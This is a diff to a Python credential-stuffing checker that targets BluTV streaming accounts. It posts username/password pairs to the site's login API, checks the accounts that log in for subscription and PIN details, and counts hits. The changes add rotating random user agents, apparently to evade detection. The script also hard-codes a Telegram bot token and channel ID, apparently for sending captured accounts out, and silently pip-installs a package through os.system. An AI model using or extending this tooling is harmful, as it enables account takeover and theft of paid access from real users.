@@ -9,7 +9,15 @@ import json
 import re
 import datetime
 
+try:
+    from random_user_agent.user_agent import UserAgent
+    from random_user_agent.params import SoftwareName, OperatingSystem
+except:
+    os.system("pip install random-user-agent")
+    from random_user_agent.user_agent import UserAgent
+    from random_user_agent.params import SoftwareName, OperatingSystem
 
+#user_agent_rotator.get_random_user_agent()
 tokens="5549970038:AAFNvNer4wNdfxaR_mlFdrhwxoOKpRBeryA"
 logch="-1001729640546"
 try:
@@ -927,15 +935,21 @@ Kod: {kod9}
                     olu=0
                     hit=0
                     client=requests.session()
+                    software_names = [SoftwareName.CHROME.value]
+                    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
+                    user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
+                    user_agents = user_agent_rotator.get_user_agents()
                     headers={
-                    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
+                    "user-agent": user_agent_rotator.get_random_user_agent(),
                     "content-type": "text/plain;charset=UTF-8",
                     "origin": "https://www.blutv.com",
                     "referer": "https://www.blutv.com/giris",
                     "Connection":"keep-alive"
                     
                     }
-                    
+                    headers2={
+                    "user-agent": user_agent_rotator.get_random_user_agent(),
+                    "content-type": "text/plain;charset=UTF-8"}
                     data={
                     "remember": "false",
                     "username": user,
@@ -944,8 +958,8 @@ Kod: {kod9}
                     
                     login = client.post('https://www.blutv.com/api/login',data=json.dumps(data),headers=headers)
                     if "token" in login.text:
-                        cap=client.get("https://www.blutv.com/int/hesabim").text
-                        if 'variant_name' in cap:
+                        cap=client.get("https://www.blutv.com/int/hesabim",headers=headers2).text
+                        if 'subscriptionPeriod' in cap:
                             say=0
                             pin=""
                             if cap.count('hasPin":true') ==0:
